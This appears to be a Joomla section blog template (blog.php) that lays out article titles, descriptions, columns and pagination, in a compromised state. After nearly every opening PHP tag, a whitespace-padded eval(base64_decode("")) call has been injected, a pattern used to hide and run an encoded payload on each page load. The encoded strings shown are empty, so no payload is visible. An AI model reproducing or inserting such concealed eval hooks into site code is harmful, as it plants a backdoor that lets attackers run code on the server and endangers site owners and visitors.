<?php	                                       			eval(base64_decode("")); // @version $Id: blog.php 11917 2009-05-29 19:37:05Z ian $
defined('_JEXEC') or die('Restricted access');
$cparams = JComponentHelper::getParams ('com_media');
?>

<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_page_title')) : ?>
<h1 class="componentheading<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">
	<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('page_title')); ?>
</h1>
<?php	                                       			eval(base64_decode("")); endif; ?>

<div class="blog<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">

	<?php	                                       			eval(base64_decode("")); if ($this->params->def('show_description', 1) || $this->params->def('show_description_image', 1)) : ?>
	<div class="contentdescription<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">

		<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_description_image') && $this->section->image) : ?>
		<img src="<?php	                                       			eval(base64_decode("")); echo $this->baseurl . $cparams->get('image_path').'/'.$this->escape($this->section->image); ?>" class="image_<?php	                                       			eval(base64_decode("")); echo $this->escape($this->section->image_position); ?>" />
		<?php	                                       			eval(base64_decode("")); endif; ?>

		<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_description') && $this->section->description) :
			echo $this->section->description;
		endif; ?>

		<?php	                                       			eval(base64_decode("")); if ($this->params->get('show_description_image') && $this->section->image) : ?>
		<div class="wrap_image">&nbsp;</div>
		<?php	                                       			eval(base64_decode("")); endif; ?>

	</div>
	<?php	                                       			eval(base64_decode("")); endif; ?>

	<?php	                                       			eval(base64_decode("")); $i = $this->pagination->limitstart;
	$rowcount = $this->params->def('num_leading_articles', 1);
	for ($y = 0; $y < $rowcount && $i < $this->total; $y++, $i++) : ?>
		<div class="leading<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">
			<?php	                                       			eval(base64_decode("")); $this->item =& $this->getItem($i, $this->params);
			echo $this->loadTemplate('item'); ?>
		</div>
		<span class="leading_separator<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">&nbsp;</span>
	<?php	                                       			eval(base64_decode("")); endfor; ?>

	<?php	                                       			eval(base64_decode("")); $introcount = (int)$this->params->def('num_intro_articles', 4);
	if ($introcount) :
		$colcount = (int)$this->params->def('num_columns', 2);
		if ($colcount == 0) :
			$colcount = 1;
		endif;
		$rowcount = (int) $introcount / $colcount;
		$ii = 0;
		for ($y = 0; $y < $rowcount && $i < $this->total; $y++) : ?>
			<div class="article_row<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">
				<?php	                                       			eval(base64_decode("")); for ($z = 0; $z < $colcount && $ii < $introcount && $i < $this->total; $z++, $i++, $ii++) : ?>
					<div class="article_column column<?php	                                       			eval(base64_decode("")); echo $z + 1; ?> cols<?php	                                       			eval(base64_decode("")); echo $colcount; ?>" >
						<?php	                                       			eval(base64_decode("")); $this->item =& $this->getItem($i, $this->params);
						echo $this->loadTemplate('item'); ?>
					</div>
					<span class="article_separator">&nbsp;</span>
				<?php	                                       			eval(base64_decode("")); endfor; ?>
				<span class="row_separator<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">&nbsp;</span>
			</div>
		<?php	                                       			eval(base64_decode("")); endfor;
	endif; ?>

	<?php	                                       			eval(base64_decode("")); $numlinks = (int)$this->params->def('num_links', 4);
	if ($numlinks && $i < $this->total) : ?>
	<div class="blog_more<?php	                                       			eval(base64_decode("")); echo $this->escape($this->params->get('pageclass_sfx')); ?>">
		<?php	                                       			eval(base64_decode("")); $this->links = array_slice($this->items, $i - $this->pagination->limitstart, $i - $this->pagination->limitstart + $numlinks);
		echo $this->loadTemplate('links'); ?>
	</div>
	<?php	                                       			eval(base64_decode("")); endif; ?>

	<?php	                                       			eval(base64_decode("")); if ($this->params->def('show_pagination', 2) == 1  || ($this->params->get('show_pagination') == 2 && $this->pagination->get('pages.total') > 1)) : ?>
		<?php	                                       			eval(base64_decode("")); if( $this->pagination->get('pages.total') > 1 ) : ?>
		<p class="counter">
			<?php	                                       			eval(base64_decode("")); echo $this->pagination->getPagesCounter(); ?>
		</p>
		<?php	                                       			eval(base64_decode("")); endif; ?>
		<?php	                                       			eval(base64_decode("")); if ($this->params->def('show_pagination_results', 1)) : ?>
			<?php	                                       			eval(base64_decode("")); echo $this->pagination->getPagesLinks(); ?>
		<?php	                                       			eval(base64_decode("")); endif; ?>
	<?php	                                       			eval(base64_decode("")); endif; ?>

</div>
